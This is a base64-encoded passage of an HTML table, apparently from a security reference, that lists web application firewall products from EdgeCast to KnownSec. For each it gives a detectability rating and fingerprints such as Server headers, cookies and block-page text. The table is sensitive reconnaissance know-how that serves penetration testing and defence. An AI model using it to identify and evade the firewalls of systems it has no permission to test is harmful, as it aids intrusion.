PjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAg
ICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAg
ICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxj
b2RlPlNlcnZlcjwvY29kZT4gaGVhZGVyIGNvbnRhaW5zIDxjb2RlPmUzTGVh
cm5pbmdfV0FGPC9jb2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAg
ICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8
L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgRWRnZUNh
c3QgKFZlcml6b24pCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNl
IGNvbnRlbnQgY29udGFpbnMgdmFsdWU8YnI+IDxjb2RlPlBsZWFzZSBjb250
YWN0IHRoZSBzaXRlIGFkbWluaXN0cmF0b3IsIGFuZCBwcm92aWRlIHRoZSBm
b2xsb3dpbmcgUmVmZXJlbmNlIElEOkVkZ2VDYXN0IFdlYiBBcHBsaWNhdGlv
biBGaXJld2FsbCAoVmVyaXpvbik8L2NvZGU+LjwvbGk+CiAgICAgICAgICAg
ICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgY29kZSByZXR1cm5zIDxj
b2RlPjQwMCBCYWQgUmVxdWVzdDwvY29kZT4gb24gbWFsaWNpb3VzIHJlcXVl
c3RzLjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8
L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAg
IDx0ZD4KICAgICAgICAgICAgRWlzb28gQ2xvdWQKICAgICAgICA8L3RkPgog
ICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
PGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5FYXN5PC9saT4KICAgICAgICAg
ICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+
CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAgPGxp
PkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250ZW50IG1heSBjb250YWluOjwv
bGk+CiAgICAgICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIDxsaT48Y29kZT4vZWlzb28tZmlyZXdhbGwtYmxv
Y2suY3NzPC9jb2RlPiByZWZlcmVuY2UuPC9saT4KICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIDxsaT48Y29kZT53d3cuZWlzb28uY29tPC9jb2RlPiBV
UkwuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29k
ZT4mY29weTsgKHllYXIpIEVpc29vIEluYy48L2NvZGU+IGtleXdvcmQuPC9s
aT4KICAgICAgICAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAg
ICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgaGFzIGZp
ZWxkIHZhbHVlIHNldCB0byA8Y29kZT5FaXNvb1dBRi1BWlVSRS9FaXNvb1dB
RjwvY29kZT4uPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICBFeHByZXNzaW9uIEVuZ2luZQogICAg
ICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAg
ICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkRpZmZpY3Vs
dDwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhv
ZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVsPgogICAgICAg
ICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgcmV0dXJu
cyA8Y29kZT5JbnZhbGlkIFVSSTwvY29kZT4gZ2VuZXJhbGx5LjwvbGk+CiAg
ICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgY29udGVu
dCBjb250YWlucyB2YWx1ZSA8Y29kZT5JbnZhbGlkIEdFVCBSZXF1ZXN0PC9j
b2RlPiB1cG9uIG1hbGljaW91cyBHRVQgcXVlcmllcy48L2xpPgogICAgICAg
ICAgICAgICAgICAgIDxsaT5CbG9ja2VkIFBPU1QgdHlwZSBxdWVyaWVzIGNv
bnRhaW4gPGNvZGU+SW52YWxpZCBEYXRhPC9jb2RlPiBpbiByZXNwb25zZSBj
b250ZW50LjwvbGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAg
ICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAg
ICAgIDx0ZD4KICAgICAgICAgICAgRjUgQVNNCiAgICAgICAgPC90ZD4KICAg
ICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxs
aT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RGlmZmljdWx0PC9saT4KICAgICAg
ICAgICAgICAgIDxsaT48Yj5EZXRlY3Rpb24gTWV0aG9kb2xvZ3k6PC9iPjwv
bGk+CiAgICAgICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICAgICAg
PGxpPkJsb2NrZWQgcmVzcG9uc2UgY29udGVudCBjb250YWlucyB3YXJuaW5n
PGJyPgogICAgICAgICAgICAgICAgICAgICAgICA8Y29kZT5UaGUgcmVxdWVz
dGVkIFVSTCB3YXMgcmVqZWN0ZWQuIFBsZWFzZSBjb25zdWx0IHdpdGggeW91
ciBhZG1pbmlzdHJhdG9yLjwvY29kZT4KICAgICAgICAgICAgICAgICAgICA8
L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4K
ICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+
CiAgICAgICAgICAgIEZvcnRpV2ViCiAgICAgICAgPC90ZD4KICAgICAgICA8
dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5E
ZXRlY3RhYmlsaXR5OiA8L2I+TW9kZXJhdGU8L2xpPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVz
cG9uc2UgaGVhZGVycyBjb250YWluIDxjb2RlPkZPUlRJV0FGU0lEPTwvY29k
ZT4gb24gbWFsaWNpb3VzIHJlcXVlc3RzLjwvbGk+CiAgICAgICAgICAgICAg
ICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWluczo8L2xp
PgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAg
ICAgICAgPGxpPlJlZmVyZW5jZSB0byA8Y29kZT4uZmdkX2ljb248L2NvZGU+
IGltYWdlIGljb24uPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxp
Pjxjb2RlPlNlcnZlciBVbmF2YWlsYWJsZSE8L2NvZGU+IGFzIGhlYWRpbmcu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZl
ciB1bmF2YWlsYWJsZS4gUGxlYXNlIHZpc2l0IGxhdGVyLjwvY29kZT4gYXMg
dGV4dC48L2xpPgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
ICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+
CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAg
R29EYWRkeQogICAgICAgIDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTog
PC9iPkVhc3k8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlv
biBNZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4K
ICAgICAgICAgICAgICAgICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdl
IGNvbnRhaW5zIHZhbHVlPGJyPiA8Y29kZT5BY2Nlc3MgRGVuaWVkIC0gR29E
YWRkeSBXZWJzaXRlIEZpcmV3YWxsPC9jb2RlPi48L2xpPgogICAgICAgICAg
ICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgog
ICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIEdy
ZXlXaXphcmQKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAg
ICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6
IDwvYj5FYXN5PC9saT4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rp
b24gTWV0aG9kb2xvZ3k6PC9iPjwvbGk+CiAgICAgICAgICAgICAgICA8dWw+
CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFn
ZSBjb25hdGluczoKICAgICAgICAgICAgICAgICAgICAgICAgPHVsPgogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPkdyZXkgV2l6YXJk
PC9jb2RlPiBhcyB0aXRsZS48L2xpPgogICAgICAgICAgICAgICAgICAgICAg
ICAgICAgPGxpPjxjb2RlPkNvbnRhY3QgdGhlIHdlYnNpdGUgb3duZXIgb3Ig
R3JleSBXaXphcmQ8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPldlJ3ZlIGRldGVjdGVk
IGF0dGVtcHRlZCBhdHRhY2sgb3Igbm9uIHN0YW5kYXJkIHRyYWZmaWMgZnJv
bSB5b3VyIElQIGFkZHJlc3M8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgog
ICAgICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAg
ICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNlcnZl
cjwvY29kZT4gaGVhZGVyIGNvbnRhaW4gPGNvZGU+Z3JleXdpemFyZDwvY29k
ZT4ga2V5d29yZC48L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAg
ICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIEh1YXdlaSBDbG91ZAogICAgICAg
IDwvdGQ+CiAgICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8
L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICA8bGk+QmxvY2tlZCByZXNwb25zZSBwYWdlIGNvbnRhaW5zOjwvbGk+
CiAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAg
ICAgICA8bGk+UmVmZXJlbmNlIHRvIDxjb2RlPmFjY291bnQuaHdjbG91ZHMu
Y29tL3N0YXRpYy9lcnJvci9pbWFnZXMvNDA0aW1nLmpwZzwvY29kZT4gZXJy
b3IgaW1hZ2UuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPlJl
ZmVyZW5jZSB0byA8Y29kZT53d3cuaHdjbG91ZHMuY29tPC9jb2RlPiBVUkwu
PC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgPGxpPlJlZmVyZW5jZSB0
byA8Y29kZT5od3Nfc2VjdXJpdHlAe3NpdGUudGxkfTwvY29kZT4gZS1tYWls
IGZvciByZXBvcnRpbmcuPC9saT4KICAgICAgICAgICAgICAgICAgICA8L3Vs
PgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAg
ICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIEh5cGVyR3VhcmQKICAgICAgICA8L3RkPgogICAgICAgIDx0
ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRl
dGVjdGFiaWxpdHk6IDwvYj5EaWZmaWN1bHQ8L2xpPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+PGNv
ZGU+U2V0LUNvb2tpZTwvY29kZT4gaGVhZGVyIGhhcyBjb29raWUgZmllbGQg
PGNvZGU+T0RTRVNTSU9OPTwvY29kZT4gaW4gcmVzcG9uc2UgaGVhZGVycy48
L2xpPgogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4K
ICAgICAgICA8L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+
CiAgICAgICAgICAgIElCTSBEYXRhUG93ZXIKICAgICAgICA8L3RkPgogICAg
ICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxp
PjxiPkRldGVjdGFiaWxpdHk6IDwvYj5EaWZmaWN1bHQ8L2xpPgogICAgICAg
ICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9s
aT4KICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8
bGk+UmVzcG9uc2UgaGVhZGVycyBjb250YWlucyBmaWVsZCB2YWx1ZSB2YWx1
ZSA8Y29kZT5YLUJhY2tzaWRlLVRyYW5zcG9ydDwvY29kZT4gd2l0aCB2YWx1
ZSA8Y29kZT5PSzwvY29kZT4gb3IgPGNvZGU+RkFJTDwvY29kZT4uPC9saT4K
ICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAg
ICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAg
ICAgICAgICBJbXBlcnZhIEluY2Fwc3VsYQogICAgICAgIDwvdGQ+CiAgICAg
ICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8bGk+
PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAgICAg
ICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4KICAg
ICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+Qmxv
Y2tlZCByZXNwb25zZSBwYWdlIGNvbnRlbnQgbWF5IGNvbnRhaW46PC9saT4K
ICAgICAgICAgICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAg
ICAgICAgICAgICAgPGxpPjxjb2RlPlBvd2VyZWQgQnkgSW5jYXBzdWxhPC9j
b2RlPiB0ZXh0IHNuaXBwZXQuPC9saT4KICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIDxsaT48Y29kZT5JbmNhcHN1bGEgaW5jaWRlbnQgSUQ8L2NvZGU+
IGtleXdvcmQuPC9saT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxs
aT48Y29kZT5fSW5jYXBzdWxhX1Jlc291cmNlPC9jb2RlPiBrZXl3b3JkLjwv
bGk+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+c3Vi
amVjdD1XQUYgQmxvY2sgUGFnZTwvY29kZT4ga2V5d29yZC48L2xpPgogICAg
ICAgICAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICAgICAgICAg
IDxsaT5Ob3JtYWwgR0VUIHJlcXVlc3QgaGVhZGVycyBjb250YWluIDxjb2Rl
PnZpc2lkX2luY2FwPC9jb2RlPiB2YWx1ZS48L2xpPgogICAgICAgICAgICAg
ICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIG1heSBjb250YWluIDxjb2Rl
PlgtSWluZm88L2NvZGU+IGhlYWRlciBmaWVsZCBuYW1lLjwvbGk+CiAgICAg
ICAgICAgICAgICAgICAgPGxpPjxjb2RlPlNldC1Db29raWU8L2NvZGU+IGhl
YWRlciBoYXMgY29va2llIGZpZWxkIDxjb2RlPmluY2FwX3NlczwvY29kZT4g
YW5kIDxjb2RlPnZpc2lkX2luY2FwPC9jb2RlPi48L2xpPgogICAgICAgICAg
ICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgog
ICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIElt
bXVuaWZ5MzYwCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmlsaXR5
OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0ZWN0
aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAgPHVs
PgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8L2NvZGU+
IGhlYWRlciBjb250YWluIDxjb2RlPmltdW5pZnkzNjAtd2Vic2hpZWxkPC9j
b2RlPiBrZXl3b3JkLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPlJl
c3BvbnNlIHBhZ2UgY29udGFpbnM6PC9saT4KICAgICAgICAgICAgICAgICAg
ICA8dWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5Qb3dl
cmVkIGJ5IEltdW5pZnkzNjA8L2NvZGU+IHRleHQgc25pcHBldC48L2xpPgog
ICAgICAgICAgICAgICAgICAgICAgICA8bGk+PGNvZGU+aW11bmlmeTM2MCBw
cmVsb2FkZXI8L2NvZGU+IGlmIHJlc3BvbnNlIHR5cGUgaXMgSlNPTi48L2xp
PgogICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICAg
ICAgPGxpPkJsb2NrZWQgcmVzcG9uc2UgcGFnZSBjb250YWlucyA8Y29kZT5w
cm90ZWN0ZWQgYnkgSW11bmlmeTM2MDwvY29kZT4gdGV4dC48L2xpPgogICAg
ICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8
L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAg
ICAgIEluZHVzR3VhcmQKICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFi
aWxpdHk6IDwvYj5Nb2RlcmF0ZTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+
PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAg
ICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2
ZXI8L2NvZGU+IGhlYWRlciBjb250YWlucyB2YWx1ZSA8Y29kZT5JRl9XQUY8
L2NvZGU+LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQg
cmVzcG9uc2UgY29udGVudCBjb250YWlucyB3YXJuaW5nPGJyPjxjb2RlPmZ1
cnRoZXIgaW52ZXN0aWdhdGlvbiBhbmQgcmVtZWRpYXRpb24gd2l0aCBhIHNj
cmVlbnNob3Qgb2YgdGhpcyBwYWdlLjwvY29kZT48L2xpPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4gYSB1bmlx
dWUgaGVhZGVyIDxjb2RlPlgtVmVyc2lvbjwvY29kZT4uPC9saT4KICAgICAg
ICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC90
ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPgogICAgICAgICAg
ICBJbnN0YXJ0IERYCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAgICAg
ICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3RhYmls
aXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+RGV0
ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAgICAg
PHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJz
IGNvbnRhaW4gPGNvZGU+WC1JbnN0YXJ0LVJlcXVlc3QtSUQ8L2NvZGU+IHVu
aXF1ZSBoZWFkZXIuPC9saT4KICAgICAgICAgICAgICAgICAgICA8bGk+UmVz
cG9uc2UgaGVhZGVycyBjb250YWluIDxjb2RlPlgtSW5zdGFydC1XTDwvY29k
ZT4gdW5pcXVlIGhlYWRlciBmaW5nZXJwcmludC48L2xpPgogICAgICAgICAg
ICAgICAgICAgIDxsaT5SZXNwb25zZSBoZWFkZXJzIGNvbnRhaW4gPGNvZGU+
WC1JbnN0YXJ0LUNhY2hlPC9jb2RlPiB1bmlxdWUgaGVhZGVyIGZpbmdlcnBy
aW50LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxpPkJsb2NrZWQgcmVz
cG9uc2UgcGFnZSBjb250YWlucyA8Y29kZT5UaGUgcmVxdWVzdGVkIFVSTCB3
YXMgcmVqZWN0ZWQuIFBsZWFzZSBjb25zdWx0IHdpdGggeW91ciBhZG1pbmlz
dHJhdG9yLjwvY29kZT4gdGV4dC48L2xpPgogICAgICAgICAgICAgICAgPC91
bD4KICAgICAgICAgICAgPC91bD4KICAgICAgICA8L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+CiAgICAgICAgICAgIElTQSBTZXJ2ZXIK
ICAgICAgICA8L3RkPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgPHVsPgog
ICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGFiaWxpdHk6IDwvYj5EaWZm
aWN1bHQ8L2xpPgogICAgICAgICAgICAgICAgPGxpPjxiPkRldGVjdGlvbiBN
ZXRob2RvbG9neTo8L2I+PC9saT4KICAgICAgICAgICAgICAgIDx1bD4KICAg
ICAgICAgICAgICAgICAgICA8bGk+UmVzcG9uc2UgcGFnZSBjb250YWluczo8
L2xpPgogICAgICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
ICAgICAgICAgPGxpPjxjb2RlPlRoZSBJU0EgU2VydmVyIGRlbmllZCB0aGUg
c3BlY2lmaWVkIFVuaWZvcm0gUmVzb3VyY2UgTG9jYXRvciAoVVJMKTwvY29k
ZT4gdGV4dCBzbmlwcGV0LjwvbGk+CiAgICAgICAgICAgICAgICAgICAgICAg
IDxsaT48Y29kZT5UaGUgc2VydmVyIGRlbmllZCB0aGUgc3BlY2lmaWVkIFVu
aWZvcm0gUmVzb3VyY2UgTG9jYXRvciAoVVJMKS4gQ29udGFjdCB0aGUgc2Vy
dmVyIGFkbWluaXN0cmF0b3IuPC9jb2RlPiB0ZXh0IHNuaXBwZXQ8L2xpPgog
ICAgICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgICAgICA8L3Vs
PgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvdGQ+CiAgICA8L3RyPgog
ICAgPHRyPgogICAgICAgIDx0ZD4KICAgICAgICAgICAgSmFudXNlYyBBcHBs
aWNhdGlvbiBHYXRld2F5CiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rh
YmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAg
ICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3Bv
bnNlIHBhZ2UgaGFzIGltYWdlIGRpc3BsYXlpbmcgPGNvZGU+SkFOVVNFQzwv
Y29kZT4gbmFtZSBhbmQgbG9nby48L2xpPgogICAgICAgICAgICAgICAgICAg
IDxsaT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgZGlzcGxheXMgPGNvZGU+SmFu
dXNlYyBBcHBsaWNhdGlvbiBHYXRld2F5PC9jb2RlPiBvbiBtYWxpY2lvdXMg
cmVxdWVzdHMuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAg
ICAgIDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICBKaWFzdWxlCiAgICAgICAgPC90ZD4K
ICAgICAgICA8dGQ+CiAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAg
IDxsaT48Yj5EZXRlY3RhYmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAg
ICAgICAgICA8bGk+PGI+RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xp
PgogICAgICAgICAgICAgICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxs
aT5CbG9ja2VkIHJlc3BvbnNlIHBhZ2UgY29udGFpbnMgcmVmZXJlbmNlIHRv
IDxjb2RlPnN0YXRpYy5qaWFzdWxlLmNvbS9zdGF0aWMvanMvaHR0cF9lcnJv
ci5qczwvY29kZT4gVVJMLjwvbGk+CiAgICAgICAgICAgICAgICAgICAgPGxp
Pjxjb2RlPlNldC1Db29raWU8L2NvZGU+IGhlYWRlciBoYXMgY29va2llIGZp
ZWxkIDxjb2RlPl9fanNsdWlkPTwvY29kZT4gb3IgPGNvZGU+anNsX3RyYWNr
aW5nPC9jb2RlPmluIHJlc3BvbnNlIGhlYWRlcnMuPC9saT4KICAgICAgICAg
ICAgICAgICAgICA8bGk+PGNvZGU+U2VydmVyPC9jb2RlPiBoZWFkZXIgaGFz
IDxjb2RlPmppYXN1bGUtV0FGPC9jb2RlPiBrZXl3b3Jkcy48L2xpPgogICAg
ICAgICAgICAgICAgICAgIDxsaT5CbG9ja2VkIHJlc3BvbnNlIGNvbnRlbnQg
aGFzIDxjb2RlPm5vdGljZS1qaWFzdWxlPC9jb2RlPiBrZXl3b3JkLjwvbGk+
CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgogICAg
ICAgIDwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD4KICAg
ICAgICAgICAgS2V5Q0ROCiAgICAgICAgPC90ZD4KICAgICAgICA8dGQ+CiAg
ICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgIDxsaT48Yj5EZXRlY3Rh
YmlsaXR5OiA8L2I+RWFzeTwvbGk+CiAgICAgICAgICAgICAgICA8bGk+PGI+
RGV0ZWN0aW9uIE1ldGhvZG9sb2d5OjwvYj48L2xpPgogICAgICAgICAgICAg
ICAgPHVsPgogICAgICAgICAgICAgICAgICAgIDxsaT48Y29kZT5TZXJ2ZXI8
L2NvZGU+IGhlYWRlciBjb250YWlucyA8Y29kZT5LZXlDRE48L2NvZGU+IGtl
eXdvcmQuPC9saT4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAg
IDwvdWw+CiAgICAgICAgPC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAg
ICAgPHRkPgogICAgICAgICAgICBLbm93blNlYwogICAgICAgIDwvdGQ+CiAg
ICAgICAgPHRkPgogICAgICAgICAgICA8dWw+CiAgICAgICAgICAgICAgICA8
bGk+PGI+RGV0ZWN0YWJpbGl0eTogPC9iPkVhc3k8L2xpPgogICAgICAgICAg
ICAgICAgPGxpPjxiPkRldGVjdGlvbiBNZXRob2RvbG9neTo8L2I+PC9saT4K
ICAgICAgICAgICAgICAgIDx1bD4KICAgICAgICAgICAgICAgICAgICA8bGk+
QmxvY2tlZCByZXNwb25zZSBwYWdlIGRpc3BsYXlzIDxjb2RlPmtzLXdhZi1l
cnJvci5wbmc8L2NvZGU+IGltYWdlICh2aWV3IHNvdXJjZSB0byBzZWUpLjwv
bGk+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L3VsPgog
